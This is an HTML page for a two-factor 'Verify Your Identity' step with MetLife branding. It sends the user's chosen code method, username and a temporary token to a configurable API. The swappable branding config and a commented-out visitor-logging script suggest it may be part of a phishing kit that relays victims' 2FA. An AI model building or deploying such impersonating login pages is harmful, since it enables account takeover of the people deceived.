<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verify Your Identity</title><link rel="stylesheet" href="styles.css">
<script src="../config.js"></script>
<!-- <script src="js/logVisitor.js"></script> -->

<style>
 .radio-sub {
  display: none;
  margin-top: 4px;
}

.radio-line input[type="radio"]:checked ~ span .radio-sub {
  display: block;
  outline: none;
}

.message-container {
  width: 100%;
  padding: 12px 16px;
  margin-bottom: 20px;
  border-radius: 4px;
  font-size: 14px;
  line-height: 1.5;
  display: none;
  align-items: center;
  gap: 10px;
}
.message-container.show {
  display: flex;
}
.message-container.success {
  background: #d4edda;
  border: 1px solid #c3e6cb;
  color: #155724;
}
.message-container.error {
  background: #f8d7da;
  border: 1px solid #f5c6cb;
  color: #721c24;
}
.message-icon {
  font-size: 16px;
  flex-shrink: 0;
}

</style>
</head>
<body><main class="page">
<img class="logo" id="globalLogo" src="./img/img.jpg" alt="MetLife logo">

<div id="messageBox" class="message-container">
  <span class="message-icon" id="messageIcon"></span>
  <span id="messageText"></span>
</div>

<section class="panel"><h1>Verify Your Identity</h1>
<div class="verify-box">
<div class="progress-row"><div class="progress"><span style="width:60%"></span></div><span class="percent">60%</span></div>
<p class="verify-text">Your protection is important to us. We need to take some extra steps to verify your identity. Please confirm how you would like to proceed.</p>
<label class="radio-line">
  <input type="radio" name="method" value="sms" checked>
  <span>
    <span class="radio-title">Text Message</span>
    <span class="radio-sub">
      Text messaging rates may apply.<br>
      View our privacy policy and terms of service.<br>
      1 message per attempt.
    </span>
  </span>
</label>

<label class="radio-line">
  <input type="radio" name="method" value="email">
  <span>
    <span class="radio-title">Email</span>
    <span class="radio-sub">
      We'll send a verification email to your address.
    </span>
  </span>
</label>

<div class="actions"><a class="btn cancel" href="login-password.html">Cancel</a><a class="btn" href="#" onclick="nextStep(); return false;">Next</a></div>
</div></section>

<div id="globalFooter" class="footer"></div>

</main>
<script>
function showMessage(message, type = 'error') {
  const messageBox = document.getElementById('messageBox');
  const messageText = document.getElementById('messageText');
  const messageIcon = document.getElementById('messageIcon');
  
  messageText.textContent = message;
  messageBox.className = 'message-container show ' + type;
  messageIcon.textContent = type === 'success' ? '✓' : '✕';
  
  // Auto-hide after 5 seconds
  setTimeout(() => {
    messageBox.classList.remove('show');
  }, 5000);
}

function initPage() {
  const logo = document.getElementById('globalLogo');
  logo.src = window.APP_CONFIG.logo;
  logo.alt = window.APP_CONFIG.logoAlt;
  
  const footer = document.getElementById('globalFooter');
  const cfg = window.APP_CONFIG.footer;
  footer.innerHTML = `<b>Contact Us</b> - Call ${cfg.company} at ${cfg.phone}, Toll Free at ${cfg.phoneToll} or Email us at <a href="#">${cfg.email}</a><br><br>${cfg.copyright}`;
  
  const tempToken = localStorage.getItem('temp_token');
  if (!tempToken) {
    window.location.href = '../index.html';
    return;
  }
  
  
}

function nextStep(){
  const method = document.querySelector('input[name="method"]:checked').value;
  const username = localStorage.getItem('metlife_username');
  const tempToken = localStorage.getItem('temp_token');
  
  localStorage.setItem('verification_method', method);
  
  fetch(window.metlife_API_BASE + '/api/two-factor/sendcode', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${tempToken}`,
    },
    body: JSON.stringify({
      username: username,
      method: method,
    }),
  })
  .then(r => r.json().then(d => ({ ok: r.ok, data: d })))
  .then(result => {
    if (!result.ok) {
      showMessage(result.data.message || 'Failed to send verification code.', 'error');
      return;
    }
    window.location.href = 'verify-code.html';
  })
  .catch(err => {
    showMessage('Unable to reach the server. Please try again.', 'error');
    console.error('Error:', err);
  });
  
  return false;
}

window.addEventListener('load', initPage);
</script>
</body></html>
